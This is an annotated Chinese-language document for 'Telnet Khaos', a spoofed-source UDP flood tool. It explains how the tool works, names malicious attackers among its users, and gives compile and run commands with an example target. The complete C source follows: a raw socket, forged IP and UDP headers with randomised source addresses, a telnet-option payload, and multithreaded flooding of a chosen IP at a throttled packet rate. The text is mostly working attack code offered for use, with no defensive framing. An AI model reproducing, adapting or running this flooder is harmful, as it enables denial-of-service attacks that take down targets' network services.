# Telnet Khaos 源代码注释文档

## 原理

Telnet Khaos 是一个网络攻击工具，其主要目标是通过发送大量伪造的UDP数据包来实现流量洪水攻击。该工具使用多线程来提高攻击效率，从而使目标主机的网络服务不可用。

### 主要功能
1. **伪造数据包**：通过构造IP和UDP头部，实现伪造数据包的发送。
2. **多线程支持**：利用多线程技术，提高数据包发送的速率和攻击的并发性。
3. **动态速率控制**：根据发送的数据包数量动态调整发送速率，避免超过指定的每秒发送包数量（PPS）限制。
4. **配置灵活性**：允许用户自定义目标IP、线程数、PPS限制和攻击持续时间。

## 目标

- **目标主机**：接受UDP数据包的任何网络设备，主要针对那些可能缺乏足够保护的服务器。
- **用户**：网络安全研究者、渗透测试者，或者出于恶意目的的攻击者。

## 功能细节

### 数据包构造
1. **IP头部**：
    - 设置IP版本为4，头部长度为5。
    - 设置目的地址、源地址、协议类型（UDP）和TTL（生存时间）。
    - 计算并设置校验和以确保数据包的完整性。

2. **UDP头部**：
    - 设置源端口和目的端口（使用随机端口）。
    - 计算数据长度，并填充特定的数据负载。

### 线程创建与管理
- 使用`pthread`库创建多个线程，每个线程负责向目标发送UDP数据包。
- 每个线程在启动时会调用`flood`函数，进行数据包发送。

### 动态发送控制
- 在主循环中，监控每秒发送的包数（PPS），并根据用户设定的限制动态调整线程的休眠时间。
- 通过控制`sleeptime`变量，来增大或减小线程的发送间隔，从而达到流量控制的目的。

## 使用方法

### 编译与运行

1. **编译源代码**：
   使用gcc或其他C编译器编译源代码：
   ```bash
   gcc -o telnet_khaos telnet_khaos.c -lpthread
2. **运行程序**：
  执行编译后的程序，提供必要的参数：
```bash
./telnet_khaos <目标IP> <线程数量> <每秒包数限制> <持续时间>
```
- **<目标IP>**：要攻击的目标主机的IP地址。
- **<线程数量>**：要使用的线程数量
- **<每秒包数限制>**：每秒发送的数据包限制，设置为-1表示不限制。
- **<持续时间>**：攻击持续的时间（以秒为单位）。

## 示例
```bash
./telnet_khaos 192.168.1.1 10 1000 60
```
该命令将向IP地址为192.168.1.1的主机发送UDP洪水攻击，使用10个线程，最大每秒1000个数据包，持续60秒。

```c
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define MAX_PACKET_SIZE 4096 // 定义数据包的最大大小为4096字节
#define PHI 0x9e3779b9       // 定义一个常量用于随机数生成算法

static unsigned long int Q[4096], c = 362436; // 定义随机数生成器的状态数组和常量
static unsigned int floodport;  // 全局变量，用于存储洪水攻击的目标端口
volatile int limiter;           // 控制每秒发送数据包的数量
volatile unsigned int pps;      // 每秒发送的数据包数
volatile unsigned int sleeptime = 100;  // 控制线程的休眠时间，用于节流

// 初始化随机数生成器
void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;                           // 初始化状态数组的第一个元素
    Q[1] = x + PHI;                     // 初始化第二个元素
    Q[2] = x + PHI + PHI;               // 初始化第三个元素
    for (i = 3; i < 4096; i++) {        // 填充剩余的元素
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; // 基于前面元素计算当前元素
    }
}

// CMWC随机数生成器
unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;          // 循环数组索引
    t = a * Q[i] + c;            // 生成随机数
    c = (t >> 32);               // 更新状态变量
    x = t + c;                   // 更新x值
    if (x < c) {                 // 检查溢出
        x++;
        c++;
    }
    return (Q[i] = r - x);       // 返回生成的随机数
}

// 计算校验和函数，用于计算IP头部的校验和
unsigned short csum(unsigned short* buf, int count)
{
    register unsigned long sum = 0;
    while (count > 1) {           // 逐对16位字进行加和
        sum += *buf++;
        count -= 2;
    }
    if (count > 0) {              // 如果剩下单独的字节，则加上
        sum += *(unsigned char*)buf;
    }
    while (sum >> 16) {          // 处理溢出位
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (unsigned short)(~sum); // 返回校验和
}

// 初始化IP头部
void setup_ip_header(struct iphdr* iph)
{
    iph->ihl = 5;                         // IP头部长度为5个32位字
    iph->version = 4;                     // IPv4协议
    iph->tos = 0;                         // 服务类型
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 33;  // 总长度
    iph->id = htonl(54321);               // 标识字段
    iph->frag_off = 0;                    // 无分片
    iph->ttl = MAXTTL;                    // 生存时间
    iph->protocol = IPPROTO_UDP;          // UDP协议
    iph->check = 0;                       // 初始校验和为0
    iph->saddr = inet_addr("192.168.3.100");  // 伪造的源IP地址
}

// 初始化UDP头部
void setup_udp_header(struct udphdr* udph)
{
    udph->source = htons(27015);          // 源端口号
    udph->dest = htons(27015);            // 目标端口号
    udph->check = 0;                      // 校验和设置为0
    void* data = (void*)udph + sizeof(struct udphdr);  // UDP负载数据的位置
    memset(data, 0xFF, 4);                // 填充负载数据前4个字节为0xFF
    // 填充负载数据
    strcpy(data + 4, "\xff\xfb\x25\xff\xfd\x26\xff\xfb\x26\xff\xfd\x03\xff\xfb\x18\xff\xfb\x1f\xff\xfb\x20\xff\xfb\x21\xff\xfb\x22\xff\xfb\x27\xff\xfd\x05");
    udph->len = htons(sizeof(struct udphdr) + 33);  // UDP长度字段
}

// UDP洪水攻击线程函数
void* flood(void* par1)
{
    char* td = (char*)par1;          // 目标IP地址
    char datagram[MAX_PACKET_SIZE];   // 数据包缓冲区
    struct iphdr* iph = (struct iphdr*)datagram;   // IP头部
    struct udphdr* udph = (void*)iph + sizeof(struct iphdr);  // UDP头部

    struct sockaddr_in sin;           // 目标地址结构体
    sin.sin_family = AF_INET;         // 使用IPv4
    sin.sin_port = htons(17015);      // 目标端口号
    sin.sin_addr.s_addr = inet_addr(td);  // 目标IP地址

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);  // 创建原始套接字
    if (s < 0) {                         // 检查套接字创建是否成功
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }

    memset(datagram, 0, MAX_PACKET_SIZE);  // 清空数据包缓冲区
    setup_ip_header(iph);                 // 初始化IP头部
    setup_udp_header(udph);               // 初始化UDP头部

    iph->daddr = sin.sin_addr.s_addr;      // 目标IP地址
    iph->check = csum((unsigned short*)datagram, iph->tot_len);  // 计算IP头部校验和

    int tmp = 1;
    const int* val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {  // 设置套接字选项，包含IP头部
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    init_rand(time(NULL));  // 初始化随机数生成器
    register unsigned int i = 0;
    while (1) {
        // 发送伪造的UDP包
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin));
        // 随机生成伪造的源IP地址
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);  // 随机生成IP包标识符
        iph->check = csum((unsigned short*)datagram, iph->tot_len);  // 重新计算校验和

        pps++;  // 发送的数据包数增加
        if (i >= limiter) {  // 如果达到限制，休眠
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}
int main(int argc, char* argv[])
{
    // 检查程序的输入参数是否满足至少5个（包括程序名称）
    if (argc < 5) {
        // 如果参数不足，打印错误信息并退出程序
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Telnet Khaos\nUsage: %s <target IP> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        exit(-1);  // 非正常退出
    }

    // 打印提示信息，表明正在设置套接字
    fprintf(stdout, "Setting up Sockets...\n");

    // 解析用户传递的参数，将线程数量和PPS限制值从字符串转换为整数
    int num_threads = atoi(argv[2]);  // 线程数量
    int maxpps = atoi(argv[3]);       // 每秒数据包发送限制（PPS）

    limiter = 0;  // 初始化限制器，用于控制发送速度
    pps = 0;      // 初始化数据包发送计数
    pthread_t thread[num_threads];  // 创建一个用于存储线程ID的数组，长度为num_threads

    int multiplier = 20;  // 用于控制时间的倍率，影响主循环的持续时间

    int i;
    // 循环创建指定数量的线程，每个线程都执行flood函数，目标为传递的IP地址
    for (i = 0; i < num_threads; i++) {
        pthread_create(&thread[i], NULL, &flood, (void*)argv[1]);  // 启动flood线程
    }

    // 打印提示信息，表示开始攻击
    fprintf(stdout, "Starting Flood...\n");

    // 根据用户输入的时间，控制主循环的持续时间
    for (i = 0; i < (atoi(argv[4]) * multiplier); i++)
    {
        // 让主线程每次循环等待一段时间
        usleep((1000 / multiplier) * 1000);  // 休眠，以ms为单位

        // 如果发送的数据包数量超过限制，调整发送速率
        if ((pps * multiplier) > maxpps)
        {
            // 如果限制器小于1，增加线程的休眠时间
            if (1 > limiter)
            {
                sleeptime += 100;  // 增加线程休眠时间
            }
            else
            {
                limiter--;  // 否则减小限制器值
            }
        }
        else
        {
            limiter++;  // 如果未超过PPS限制，增加限制器值
            if (sleeptime > 25)
            {
                sleeptime -= 25;  // 减少线程的休眠时间
            }
            else
            {
                sleeptime = 0;  // 将休眠时间设置为0，达到最大发送速率
            }
        }

        pps = 0;  // 每次循环结束，重置数据包发送计数
    }

    // 程序正常结束
    return 0;
}
```

 

 
